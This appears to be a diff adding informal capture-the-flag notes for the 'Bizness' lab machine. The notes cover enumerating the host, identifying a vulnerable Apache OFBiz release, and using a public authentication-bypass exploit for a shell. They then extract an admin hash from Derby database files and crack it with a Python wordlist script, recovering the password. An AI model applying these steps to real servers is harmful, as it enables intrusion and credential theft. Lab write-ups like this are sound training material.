@@ -1,0 +1,146 @@
+bizness
+	
+	22/tcp    open  ssh
+
+	80/tcp    open  http
+		302 - moved permanently
+	
+	
+	443/tcp   open  https
+		uses a self-signed https cert
+
+		email field in the bottom of the page not sql injectable (POST https://bizness.htb)
+		
+		server sets JSESSIONID (ex 38AFDF3BDFABBBBAA1457ECC5868B180.jvm1) - it's probably spring boot
+
+		/actuators not accessible (all requests give 302)
+		
+		ffuf directory-list-2.3 ->
+
+		/control gives an interesting error message
+			it suggests the server is running apache ofbiz and possibly tomcat
+			https://bizness.htb/webtools/control/main is accessible
+			
+			we have 18.12 release of ofbiz, which is vulnerable to xml serialization rce
+		
+				https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass				
+				gives shell as user ofbiz
+				it's the only user on the machine and has a user flag in /home/ofbiz
+
+	44635/tcp open  unknown
+
+
+	getting root
+		
+		running linpeas.sh		
+		it finds /etc/systemd/system/ofbiz.service calling gradlew but the service is sadly run as user
+		nothing else is of interest in the report
+
+		printenv doesn't have anything useful
+
+		we have sources in /opt/ofbiz
+		database and/or admin passwords?
+			
+			judging by stuff in framework/entity/config/entityengine.xml,
+			database used is apparently apache derby, which stores data locally in a bunch of .dat files (impossible to read)
+			ij tool for connecting is also not present on the box
+		
+		random googling found this: https://stackoverflow.com/questions/46864959/forgot-apache-ofbiz-admin-password/47453020#47453020 - gradlew loadAdminUserLogin -PuserLoginId=myadmin
+		since this is java we're dealing with, and java likes literal naming, we are looking for something that contains the string "UserLogin" somewhere in the sources
+		grep -Hrn UserLogin returns too much stuff
+		find . -iname "*userlogin*" surprisingly finds matches
+
+		doing tail -n +1 $(find . -iname "*userlogin*") | less
+		
+		==> ./plugins/example/testdef/assertdata/TestUserLoginData.xml <==
+			<entity-engine-xml>
+			    <UserLogin userLoginId="system" enabled="N" isSystem="Y"/>
+			    <UserLogin userLoginId="anonymous" enabled="N"/>
+			    <UserLogin userLoginId="admin" currentPassword="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"/>
+			</entity-engine-xml>
+
+
+		==> ./framework/resources/templates/AdminUserLoginData.xml <==
+			
+			<entity-engine-xml>
+    				<UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
+			        <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
+			</entity-engine-xml>
+
+		are the two reasonably meaningful results from there. But this is pretty useless because those passwords are hashed, and since the location of last one is called "templates" - it's probably some default garbage
+		
+		currentPassword looks like an existing variable though, maybe search that?
+
+			grep -Hrin currentPassword | wc -l 
+				gives 199 matches. bruh.
+
+			BUT, running this we notice something:
+				grep: runtime/data/derby/ofbiz/seg0/c54d0.dat: binary file matches
+			this is the path we found while trying to get to the database, does this file store user table data?
+				strings runtime/data/derby/ofbiz/seg0/c54d0.dat
+					gives plaintext xml. wtf? why would a binary database file contain plaintext xml?
+
+				        <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
+
+						so user id is admin but password hash is different? but it might correspond to contents of ./framework/resources/templates/AdminUserLoginData.xml
+						
+						wtf is $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I?
+						hashid recognizes 47ca69ebb4bdc9ae0adec130880165d2cc05db1a as sha-1 but gives error on $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+						
+						plaintext attack? let's hope it's not salted
+
+							import hashlib
+
+							sample = "47ca69ebb4bdc9ae0adec130880165d2cc05db1a"
+
+							f = open("rockyou.txt", errors="ignore")
+
+							for line in f:
+							    h = hashlib.sha1(line.strip().encode()).hexdigest()
+
+							    if h == sample:
+							        print(line)
+							        print(h)
+							        quit()
+
+						this doesn't find matches and according to https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java
+						it is salted. FML
+
+						BUT. in that same file we find those two lines
+							sb.append("$").append(hashType).append("$").append(salt).append("$");
+					        	sb.append(getCryptedBytes(hashType, salt, bytes));
+
+						so this weird format is specific to ofbiz and follows this pattern - $SHA$salt$hashed_salted_password
+						the weird-looking hash is due to Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
+
+						so the way to undo this in python is base64.urlsafe_b64decode("uP0_QaVBpDWFeo8-dRzDqRwXQ2I".replace('.', '+') + "==").hex()
+						
+						updated pta code:
+
+							import hashlib
+							import base64
+
+							# ofbiz format - $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+
+							sample = base64.urlsafe_b64decode("uP0_QaVBpDWFeo8-dRzDqRwXQ2I".replace('.', '+') + "==").hex()
+
+							f = open("rockyou.txt", errors="ignore")
+
+							for line in f:
+							    h = hashlib.sha1()
+
+							    h.update("d".encode())
+							    h.update(line.strip().encode())
+
+							    if h.hexdigest() == sample:
+							        print(line, '-', h.hexdigest())
+							        print()
+							        quit()
+						
+						outputs
+						monkeybizness - b8fd3f41a541a435857a8f3e751cc3a91c174362
+						
+						
+
+
+			
